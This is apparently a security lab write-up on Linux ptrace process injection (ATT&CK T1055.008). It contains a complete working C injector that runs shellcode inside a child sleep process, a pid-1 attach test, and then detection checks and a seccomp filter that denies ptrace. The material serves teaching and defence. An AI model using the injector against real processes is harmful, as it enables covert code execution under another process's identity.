GH-003 T1055.008 PHASE RED INSIDE

The Borrowed Body

Your debugger does this every day. This file takes gdb's favorite trick, reaching into a running process and making it execute your code, and runs it by hand: a sleeping process wakes just long enough to betray its own pid, then goes back to sleep. Then we catch the intrusion two ways and lock the exact door it came through.

01

Intel Brief

CONTEXT

MITRE ATT&CK T1055.008: adversaries inject code into processes with the ptrace system call, the same kernel API debuggers use to inspect and control other processes. This file runs the debugger's machinery by hand, as the attack.

Why this technique. ptrace is not a bug. It is the designed interface by which a debugger reads another process's memory, rewrites its registers, and single-steps its instructions. When gdb runs call malloc(64) inside your program, it performs exactly the sequence this file performs: hijack the registers, make the victim execute something, restore everything. The attack is legitimate machinery used with hostile intent, which is why it cannot be patched away. It can only be narrowed and watched.

Why not the Windows version. The famous injection demos are Windows: CreateRemoteThread, reflective DLL injection. The idea ports directly; the machinery does not. Linux has no remote-thread API, so its native injection primitive is ptrace, with its own sub-technique ID. This file does the Linux-native version.

Why the victim must be our child. Ubuntu's default Yama scope of 1 lets a process trace only its descendants; a stranger's attach fails with EPERM, verified in Phase Blue. So the injector spawns its own victim, exactly as real malware does: launch something benign-looking, then borrow its body. No protection was disabled for this lab.

The concrete case, before the abstraction. ./inject prints victim's real pid is 17503 -> MATCH. borrowed body confirmed. The 8 bytes in /tmp/gh003_pwned decode to 17503, the pid of a sleeping process that never agreed to run anything. The memory-map diff shows one new line, an anonymous rwxp region that was not there before the attach. Same kernel, same process list, one borrowed body.

Terms, earned. ptrace is the syscall family (PTRACE_ATTACH, PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_SINGLESTEP, PTRACE_CONT, PTRACE_DETACH) for controlling another process. The tracer controls; the tracee is controlled. rip is the instruction pointer: where the victim executes next. A syscall gadget is two bytes, 0f 05, the syscall instruction, borrowed from the victim's own libc so the victim can be made to invoke any syscall. Remote mmap is making the victim call mmap on itself, so it allocates the hiding place with its own authority. Shellcode is position-independent machine code; ours is 104 bytes that call getpid and write the result to a file. process_vm_writev copies memory into another process. ERESTART_RESTARTBLOCK is the kernel cookie left in rax when a process is frozen mid-syscall; resume with it intact and the kernel restarts the syscall instead of running your code, which bit us in the lab and is explained in Phase Red. Yama is the kernel's ptrace-scope module; scope 1, the Ubuntu default, restricts tracing to descendants. seccomp-bpf is a per-process syscall filter, and the principled lock for this door.

Scope. T1055 has twelve sub-techniques, from DLL injection to VDSO hijacking. This file works one of them end to end, the ptrace one, because it is the Linux-native primitive and the richest teaching target. One implementation, one resolution, among many.

02

Target Environment

LOADOUT

Ubuntu 24.04.5 LTS with gcc 13, x86-64, in a disposable VM used only for this lab. The attack needs no privilege beyond spawning its own child. Run it on a throwaway box anyway: you are about to inject code into a live process on purpose.

1

Build the lab

One C file for the attack: inject.c. The defender's tools are built in the sections that use them.

bash
$ gcc -O2 -o inject inject.c
2

The injector: inject.c

Read it as three parts. The shellcode block at the top is position-independent machine code assembled by gcc itself: open a file, getpid, write the pid, close, int3. find_syscall_gadget scans the victim's executable mappings through /proc/<pid>/mem for the two bytes 0f 05. main runs the seven moves: fork the victim, attach, remote-mmap a cave, copy in the shellcode, run it, verify the pid, restore and detach. The one line setting r.rax = -1 before resuming is the whole difference between a working injector and a crash; Phase Red explains why.

c: inject.c
/* GH-003 lab: ptrace process injection (T1055.008), x86_64 Linux.
 * Spawns /bin/sleep as a child, attaches with ptrace, makes the child
 * mmap() a fresh RWX page via a remote syscall, writes position-
 * independent shellcode there, and runs it INSIDE the victim. The
 * shellcode calls getpid() and writes the pid to /tmp/gh003_pwned,
 * proving the code executed under the victim's identity.
 * Safe lab: the victim is our own child, and we restore its registers. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/mman.h>

/* ---- position-independent shellcode, assembled by gcc itself ---- */
__asm__(
".global sc_start, sc_end\n"
"sc_start:\n"
"  lea sc_path(%rip), %rdi\n"   /* pathname */
"  mov $0x241, %esi\n"          /* O_WRONLY|O_CREAT|O_TRUNC */
"  mov $0x1a4, %edx\n"          /* 0644 */
"  mov $2, %eax\n"              /* sys_open */
"  syscall\n"
"  mov %rax, %r12\n"            /* fd -> r12 */
"  mov $39, %eax\n"             /* sys_getpid */
"  syscall\n"
"  mov %rax, sc_pidbuf(%rip)\n" /* stash pid */
"  mov $1, %eax\n"              /* sys_write */
"  mov %r12, %rdi\n"
"  lea sc_pidbuf(%rip), %rsi\n"
"  mov $8, %edx\n"
"  syscall\n"
"  mov $3, %eax\n"              /* sys_close */
"  mov %r12, %rdi\n"
"  syscall\n"
"  int3\n"                      /* stop: tracer sees SIGTRAP */
"sc_path: .asciz \"/tmp/gh003_pwned\"\n"
".align 8\n"
"sc_pidbuf: .quad 0\n"
"sc_end:\n"
);
extern char sc_start, sc_end;

static void die(const char *m) { perror(m); exit(1); }

/* find a `syscall` (0f 05) gadget in the victim's executable mappings */
static uint64_t find_syscall_gadget(pid_t pid) {
    char maps[64], mem[64];
    snprintf(maps, sizeof maps, "/proc/%d/maps", pid);
    snprintf(mem, sizeof mem, "/proc/%d/mem", pid);
    FILE *f = fopen(maps, "r");
    if (!f) die("fopen maps");
    int mfd = open(mem, O_RDONLY);
    if (mfd < 0) die("open mem");
    char line[512];
    uint64_t found = 0;
    while (fgets(line, sizeof line, f)) {
        uint64_t lo, hi;
        char perms[8];
        if (sscanf(line, "%lx-%lx %7s", &lo, &hi, perms) != 3) continue;
        if (perms[0] != 'r' || perms[2] != 'x') continue;
        size_t len = hi - lo;
        uint8_t *buf = malloc(len);
        if (!buf) die("malloc");
        ssize_t n = pread(mfd, buf, len, lo);
        for (ssize_t i = 0; i + 1 < n && !found; i++)
            if (buf[i] == 0x0f && buf[i + 1] == 0x05) found = lo + i;
        free(buf);
        if (found) break;
    }
    fclose(f);
    close(mfd);
    return found;
}

static void wait_stopped(pid_t pid, const char *what) {
    int wst;
    if (waitpid(pid, &wst, 0) < 0) die("waitpid");
    if (!WIFSTOPPED(wst)) { fprintf(stderr, "%s: not stopped (st=%x)\n", what, wst); exit(1); }
}

int main(int argc, char **argv) {
    int pause_after = argc > 1 && strcmp(argv[1], "--pause") == 0;
    unlink("/tmp/gh003_pwned");
    pid_t v = fork();
    int st;
    if (v == 0) { execl("/bin/sleep", "sleep", "600", NULL); die("execl"); }
    printf("[*] victim: sleep, pid %d (our child)\n", v);
    sleep(1);

    if (ptrace(PTRACE_ATTACH, v, 0, 0) < 0) {
        kill(v, SIGKILL);   /* do not orphan the victim on failure */
        waitpid(v, &st, 0);
        die("PTRACE_ATTACH");
    }
    wait_stopped(v, "attach");
    printf("[*] attached. victim frozen mid-sleep.\n");
    { /* blue-phase evidence: snapshot the victim's memory map before... */
        char cmd[128];
        snprintf(cmd, sizeof cmd, "cat /proc/%d/maps > /tmp/gh003_maps_before", v);
        if (system(cmd) != 0) die("maps before");
    }

    struct user_regs_struct orig, r;
    if (ptrace(PTRACE_GETREGS, v, 0, &orig) < 0) die("GETREGS");

    uint64_t gadget = find_syscall_gadget(v);
    if (!gadget) { fprintf(stderr, "no syscall gadget\n"); return 1; }
    printf("[*] syscall gadget at 0x%lx (borrowed from victim's own libc)\n", gadget);

    /* remote mmap(NULL, 8192, RWX, PRIVATE|ANON, -1, 0) */
    r = orig;
    r.rax = 9; r.rdi = 0; r.rsi = 8192; r.rdx = 7;
    r.r10 = 0x22; r.r8 = -1; r.r9 = 0; r.rip = gadget;
    if (ptrace(PTRACE_SETREGS, v, 0, &r) < 0) die("SETREGS mmap");
    if (ptrace(PTRACE_SINGLESTEP, v, 0, 0) < 0) die("SINGLESTEP");
    wait_stopped(v, "mmap");
    if (ptrace(PTRACE_GETREGS, v, 0, &r) < 0) die("GETREGS mmap");
    uint64_t cave = r.rax;
    printf("[*] victim mmapped us a cave at 0x%lx\n", cave);

    size_t sclen = (size_t)(&sc_end - &sc_start);
    struct iovec local = { &sc_start, sclen };
    struct iovec remote = { (void *)cave, sclen };
    if (process_vm_writev(v, &local, 1, &remote, 1, 0) != (ssize_t)sclen)
        die("process_vm_writev");
    printf("[*] wrote %zu bytes of shellcode into the victim\n", sclen);

    r = orig; r.rip = cave;
    r.rax = (unsigned long long)-1; /* attaching froze the victim inside nanosleep,
        so orig.rax holds -ERESTART_RESTARTBLOCK. Resuming with that cookie in
        rax makes the kernel hijack the resume to restart the syscall instead of
        running our code. Any other value disarms it. */
    if (ptrace(PTRACE_SETREGS, v, 0, &r) < 0) die("SETREGS run");
    if (ptrace(PTRACE_CONT, v, 0, 0) < 0) die("CONT");
    waitpid(v, &st, 0);
    if (!WIFSTOPPED(st) || WSTOPSIG(st) != SIGTRAP) {
        fprintf(stderr, "expected SIGTRAP, got st=%x\n", st); return 1;
    }
    printf("[*] shellcode hit int3. it ran INSIDE the victim.\n");
    { /* ...and after the injection, so the blue phase can diff them. */
        char cmd[128];
        snprintf(cmd, sizeof cmd, "cat /proc/%d/maps > /tmp/gh003_maps_after", v);
        if (system(cmd) != 0) die("maps after");
    }

    int fd = open("/tmp/gh003_pwned", O_RDONLY);
    if (fd < 0) die("open pwned");
    uint64_t pid_in_file = 0;
    if (read(fd, &pid_in_file, 8) != 8) die("read pwned");
    close(fd);
    printf("[*] /tmp/gh003_pwned says the code ran as pid %lu\n", (unsigned long)pid_in_file);
    printf("[*] victim's real pid is %d -> %s\n", v,
           pid_in_file == (uint64_t)v ? "MATCH. borrowed body confirmed." : "MISMATCH");

    if (pause_after) {
        printf("[*] PAUSED: victim %d holds the injected mapping. Inspect /proc/%d/maps, then press Enter.\n", v, v);
        getchar();
    }
    if (ptrace(PTRACE_SETREGS, v, 0, &orig) < 0) die("restore");
    if (ptrace(PTRACE_DETACH, v, 0, 0) < 0) die("DETACH");
    printf("[*] registers restored, detached. victim resumes its nap.\n");
    kill(v, SIGKILL);
    waitpid(v, &st, 0);
    return pid_in_file == (uint64_t)v ? 0 : 1;
}

Note the hygiene: the maps snapshots exist so Phase Blue can diff them, the --pause flag freezes the victim mid-intrusion for inspection, and the attach-failure path kills the forked victim instead of orphaning it. A lab that leaves sleepers behind is a lab that lies about cleanup.

03

Phase Red: borrow the body

ATTACK

The attack has seven moves: spawn the victim, freeze it, borrow a syscall instruction from its own libc, make it allocate a hiding place, copy in the shellcode, run it, and vanish. Watch the full sequence, then reproduce it.

1

Run it, read the proof

One command. The proof is the last three lines: the file says the code ran as pid 17503, and 17503 is the victim.

bash
$ ./inject
[*] victim: sleep, pid 17503 (our child)
[*] attached. victim frozen mid-sleep.
[*] syscall gadget at 0x757e17df38b5 (borrowed from victim's own libc)
[*] victim mmapped us a cave at 0x757e17fe8000
[*] wrote 104 bytes of shellcode into the victim
[*] shellcode hit int3. it ran INSIDE the victim.
[*] /tmp/gh003_pwned says the code ran as pid 17503
[*] victim's real pid is 17503 -> MATCH. borrowed body confirmed.
[*] registers restored, detached. victim resumes its nap.
$ od -A d -t u8 /tmp/gh003_pwned
0000000                17503
0000008

od reads the 8 raw bytes as one unsigned 64-bit integer: 17503. Those bytes were written by the write syscall executed inside sleep's address space, with sleep's pid in the register. There is no other way for that number to be in that file.

2

The seven moves, precisely

Move 1, spawn. fork, and the child execs /bin/sleep. The victim is our child, so Yama scope 1 permits the attach. Real malware does the same: it launches the process it intends to wear.

Move 2, freeze. PTRACE_ATTACH stops the victim mid-nanosleep. Its registers are now ours to read and write.

Move 3, borrow the gadget. Scan the victim's executable mappings for the bytes 0f 05, the syscall instruction, inside its own libc. We do not bring our own syscall instruction; we borrow the victim's, so the kernel sees the victim invoking the syscall.

Move 4, remote mmap. Load the registers as if the victim itself were calling mmap(NULL, 8192, RWX, PRIVATE|ANONYMOUS): rax=9, rdi=0, rsi=8192, rdx=7, r10=0x22, r8=-1, r9=0, rip=gadget. Single-step once. The victim allocates an 8KB executable cave, and the address comes back in rax. The victim built its own hiding place.

Move 5, copy. process_vm_writev writes the 104 shellcode bytes into the cave. Nothing executes yet.

Move 6, run. Set rip to the cave, clear the restart cookie (see the callout), and continue. The shellcode runs: open, getpid, write, close, int3. Five syscalls, all charged to the victim's pid.

Move 7, vanish. The int3 raises SIGTRAP, which stops the victim and hands control back. Verify the file, restore the saved registers, detach. The victim resumes its nanosleep. Its code, its stack, and its memory are untouched; for one millisecond it was someone else.

The trap we fell into. The first version of this injector crashed every run: SIGSEGV at an impossible address, two bytes before the cave. The cause took an hour. Attaching had frozen the victim inside nanosleep, so rax held -ERESTART_RESTARTBLOCK, a kernel cookie meaning "restart this syscall when resumed." Resuming with that cookie intact made the kernel take the syscall-restart path instead of running our code. The fix is one line: set rax to -1 before resuming. gdb handles this silently every time you attach to a sleeping process; doing it by hand is what "frozen mid-syscall" actually means.

Stealth confirmed

One unprivileged process made another process execute its code, under the victim's pid and with the victim's authority. No exploit, no privilege escalation, no kernel module: just the debugger API, used as designed, by the wrong party. The process list never changed. Nothing was hidden, because nothing needed to be.

04

Phase Blue: two independent observations

DEFENSE

The injector's stdout proves the attack worked; it detects nothing. Detection is observations the attacker does not control. Here are two, plus the exact boundary of the default protection.

Here is the trap most defenders walk into: ps shows the victim, top shows it sleeping, the logs show nothing. Every one of those is true and every one misses the point. The process was never hidden and never modified; it was borrowed for a millisecond. You cannot detect this by looking at the process list. You detect it by looking at the relationships the kernel maintains about the process.

1

Observation one: the tracer relationship

The kernel always knows who is controlling whom. While the injector holds the victim, /proc says so plainly.

bash
$ ./inject --pause > red.log 2>&1 &
$ sleep 2
$ VP=$(sed -n 's/.*victim: sleep, pid \([0-9]*\).*/\1/p' red.log)
$ grep -E '^(TracerPid|State):' /proc/$VP/status
TracerPid:      16846
State:  t (tracing stop)

State t means tracing stop; TracerPid names the controller. A daemon sitting in state t with a TracerPid you do not recognize is the intrusion, stated in two lines. After the detach, TracerPid returns to 0, which is exactly why one observation is not enough: the relationship is only visible while the borrowing is in progress.

2

Observation two: the memory-map diff

The cave survives the detach. It is anonymous, executable, and it was not there before. The injector snapshots the maps on both sides of the intrusion; the diff is the detection.

bash
$ diff /tmp/gh003_maps_before /tmp/gh003_maps_after
13a14
> 7f8b3c1e9000-7f8b3c1eb000 rwxp 00000000 00:00 0

One added line: an 8KB rwxp region with no file behind it (the 00:00 device). Legitimate processes almost never gain anonymous executable mappings mid-life; JIT compilers are the exception, and sleep is not a JIT. Baseline the maps of the processes that matter, diff on a timer, and this line is your alert. D3FEND names the general form System Call Analysis (D3-SCA): the ptrace, mmap, and process_vm_writev sequence from a single parent is the behavioral signature behind the artifact.

3

The Yama boundary, and its hole

Ubuntu ships Yama scope 1: a process may trace only its descendants. Here is the boundary, verified live.

bash
$ cat /proc/sys/kernel/yama/ptrace_scope
1
$ runuser -u nobody -- python3 -c "import ctypes; l=ctypes.CDLL('libc.so.6',use_errno=True); r=l.ptrace(16,1,0,0); print('non-child attach as nobody ->',r,'errno',ctypes.get_errno())"
non-child attach as nobody -> -1 errno 1

Errno 1 is EPERM: a stranger cannot attach. But the entire red phase ran under this same scope, because the injector is the victim's parent, and parents are always allowed. The control shapes the attack without stopping it: the adversary simply becomes the parent first, spawning the process it intends to wear. A defense that the attacker routes around by changing one line is a speed bump with a threat model attached.

Detection verified

Two observations neither share the attacker's control: the kernel's tracer relationship (State t, TracerPid) and the one-line memory-map diff. Yama scope 1 was measured too, boundary and hole both. None of these ask the process list anything.

05

Countermeasures

DEFENSE

Three moves, in order: confirm nothing persists, watch the map, deny the syscall. Each is one way, not the way.

1

Mitigate: confirm it is memory-only

Kill the victim and the cave dies with the address space. This injection has no file, no persistence, and no reboot survival: it is a purely in-memory borrowing. That cuts two ways. Recovery is trivial, kill the process. But there is also nothing to find afterward except the maps diff, which is why observation two exists. (The /tmp/gh003_pwned file is our proof artifact, not the attacker's tradecraft; a real payload exfiltrates or stays resident, it does not leave labeled evidence.)

2

Monitor: watch the map

Baseline /proc/<pid>/maps for the long-lived processes that matter, diff on a timer, alert on new anonymous rwxp regions. The one-liner below is the whole monitor; production versions add baselines and alerting, not new ideas.

bash
$ for p in $(pgrep -x cron); do diff "/var/lib/ghostlight/maps.$p.base" "/proc/$p/maps"; done

Pair it with the tracer check: any long-lived process in State t whose TracerPid is not your debugger is worth a page. D3FEND's System Call Analysis (D3-SCA) is the behavioral form of the same idea: the ptrace, remote-mmap, process_vm_writev sequence from a single parent is the signature, whether or not you catch the maps diff.

3

Prevent: deny the syscall

The principled lock is seccomp-bpf: forbid the process tree from calling ptrace at all. nospy.c installs a six-instruction BPF filter (any ptrace syscall returns EPERM) and execs its target under it. This is what Chrome's sandbox and systemd's SystemCallFilter=~ptrace do in production.

c: nospy.c
/* nospy.c - GH-003 lab tool: run a program with ptrace() denied by seccomp-bpf.
 * Installs a tiny BPF filter (any ptrace() -> EPERM), then execs the target.
 * Models what hardened launchers do: Chrome's sandbox and systemd's
 * SystemCallFilter=~ptrace both deny this syscall outright.
 * Usage: ./nospy ./inject   (the injector's PTRACE_ATTACH then fails) */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <prog> [args...]\n", argv[0]); return 1; }
    struct sock_filter f[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM & 0xffff)),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog p = { (unsigned short)(sizeof f / sizeof f[0]), f };
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) { perror("no_new_privs"); return 1; }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &p) < 0) { perror("seccomp"); return 1; }
    printf("[nospy] seccomp filter live: ptrace() is now denied for this tree.\n");
    fflush(stdout);
    execvp(argv[1], &argv[1]);
    perror("execvp");
    return 1;
}
bash, commands in this recording
$ gcc -O2 -o nospy nospy.c
$ ./nospy ./inject; echo "exit=$?"
[nospy] seccomp filter live: ptrace() is now denied for this tree.
PTRACE_ATTACH: Operation not permitted
exit=1

D3FEND names this System Call Filtering (D3-SCF): controlling access to system resources at the kernel level. The filter is inherited across exec, so everything the injector launches is bound too.

Honest limit. The filter must be installed by whoever launches the process tree; it binds the injector's own tree, not the system. An attacker who launches their own injector outside any filter is unaffected, which is why this is a launcher's control, not a system property. The system-wide knobs are Yama scopes 2 and 3, but they need sysctl write access (read-only in some VMs and containers, including the one this file was verified on), and scope 3 disables debugging for everyone, yourself included. ptrace cannot be removed from the system without breaking the toolchain. It can only be narrowed, which is what this step does.

Countermeasures verified

The injection is memory-only, so killing the victim ends it. The maps diff plus the tracer check catch it while it runs. The seccomp filter denies the ptrace syscall outright for a launched tree, verified live. None of these survive an attacker who operates outside the filtered tree; defense here is narrowing, not removal.

06

Debrief

TAKEAWAY

A process that can be ptraced can be worn like a suit. Watch the tracer relationship and the memory map, not just the process list.

IOC checklist: signs this technique was used

  • A process in State t (tracing stop) with a TracerPid you do not recognize
  • New anonymous rwxp mappings in a process that never JITs (diff /proc/<pid>/maps against baseline)
  • ptrace, process_vm_writev, or unexpected remote-mmap sequences from a single parent
  • Short-lived children of long-lived daemons that attach and detach: the spawn-then-borrow pattern
  • Seccomp denials for the ptrace syscall from a tree that was supposed to be filtered

Reproducibility checklist

  • Verified on Ubuntu 24.04.5 LTS, gcc 13, x86-64, on 2026-09-16
  • All four recordings are real executions on that platform, not simulations
  • The attack runs unprivileged: the victim is the attacker's child, and no Yama setting was changed
  • Cleanup: the injector kills its victim; rm -f /tmp/gh003_pwned /tmp/gh003_maps_before /tmp/gh003_maps_after
